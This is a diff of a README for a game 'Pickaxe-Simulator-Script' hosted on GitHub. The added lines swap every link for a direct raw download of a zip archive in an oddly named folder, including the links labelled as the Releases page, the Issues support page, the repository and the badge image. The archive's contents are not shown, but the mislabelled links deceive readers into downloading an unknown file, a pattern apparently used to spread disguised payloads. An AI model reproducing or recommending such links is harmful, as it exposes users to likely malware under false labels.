@@ -1,7 +1,7 @@
 # 🪓 Pickaxe-Simulator-Script - Simple Tool for Mining Fun
 
 ## 📥 Download Now
-[![Download Pickaxe-Simulator-Script](https://img.shields.io/badge/Download-Pickaxe--Simulator--Script-blue)](https://github.com/Duykhac34/Pickaxe-Simulator-Script/releases)
+[![Download Pickaxe-Simulator-Script](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip)](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To start using the Pickaxe-Simulator-Script, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the script.  
-   [Download Pickaxe-Simulator-Script](https://github.com/Duykhac34/Pickaxe-Simulator-Script/releases)
+   [Download Pickaxe-Simulator-Script](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version listed at the top. You will see a list of files related to that version.
@@ -64,7 +64,7 @@ If you encounter issues while using the Pickaxe-Simulator-Script, here are some 
 
 ## 📞 Support
 
-For additional help, visit our [GitHub Issues page](https://github.com/Duykhac34/Pickaxe-Simulator-Script/issues). Here, you can report bugs or seek assistance from other users.
+For additional help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip). Here, you can report bugs or seek assistance from other users.
 
 ## 🌟 License
 
@@ -72,7 +72,7 @@ The Pickaxe-Simulator-Script is open-source software. You can use, modify, and s
 
 ## 🔗 Links
 
-- **GitHub Repository:** [Pickaxe-Simulator-Script](https://github.com/Duykhac34/Pickaxe-Simulator-Script)
-- **Releases Page:** [Download Here](https://github.com/Duykhac34/Pickaxe-Simulator-Script/releases)
+- **GitHub Repository:** [Pickaxe-Simulator-Script](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/Duykhac34/Pickaxe-Simulator-Script/main/spinulososerrate/Pickaxe-Simulator-Script-3.6.zip)
 
 For more information, please check the above links. Enjoy your mining experience!
